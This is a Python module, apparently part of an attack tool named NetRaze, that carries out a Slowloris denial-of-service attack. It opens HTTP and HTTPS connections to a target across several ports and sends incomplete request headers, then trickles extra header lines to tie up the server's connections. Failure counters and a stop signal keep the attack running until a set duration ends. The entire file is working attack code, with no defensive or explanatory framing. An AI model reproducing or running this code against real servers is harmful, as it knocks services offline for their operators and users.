import socket
import ssl
import time

def launch(target_ip, port_list, duration, tag, stop_event, fail_tracker):
    start_time = time.time()
    failed = 0
    sent = 0  # Track successful connections
    consecutive_no_send = 0
    max_no_send = 10

    def slowloris_attack(s, target_ip):
        s.sendall(b"GET / HTTP/1.1\r\n")
        s.sendall(b"Host: %b\r\n" % target_ip.encode())
        s.sendall(b"User-Agent: NetRazeSlowloris\r\n")
        s.sendall(b"Content-Length: 1000000\r\n")
        s.sendall(b"\r\n")

        for _ in range(100):
            if stop_event.is_set():
                break
            s.send(b"X-a: b\r\n")
            time.sleep(0.5)

    while not stop_event.is_set():
        if duration and time.time() - start_time > duration:
            break

        iteration_sent = 0

        for port in port_list:
            # Try HTTP first, then HTTPS
            protocols = ["http", "https"]

            for proto in protocols:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)

                    if proto == "https":
                        context = ssl.create_default_context()
                        s = context.wrap_socket(s, server_hostname=target_ip)

                    s.connect((target_ip, port))
                    slowloris_attack(s, target_ip)
                    s.close()

                    sent += 1
                    iteration_sent += 1
                    break  # If successful, don't try next protocol

                except Exception:
                    failed += 1
                    # On failure to HTTPS, try HTTP next (so don't break)
                    # On failure to HTTP, just continue

                if failed > 20:
                    fail_tracker.append(f"{tag}-{port}")
                    stop_event.set()
                    print(f"[x] {tag} on port {port} stopped due to failures.")
                    return

        if iteration_sent == 0:
            consecutive_no_send += 1
        else:
            consecutive_no_send = 0

        if consecutive_no_send >= max_no_send:
            stop_event.set()
            print(f"[x] {tag} stopped due to {consecutive_no_send} consecutive iterations with no successful sends.")
            return

    print(f"[i] {tag} finished: Sent {sent} Slowloris connections")
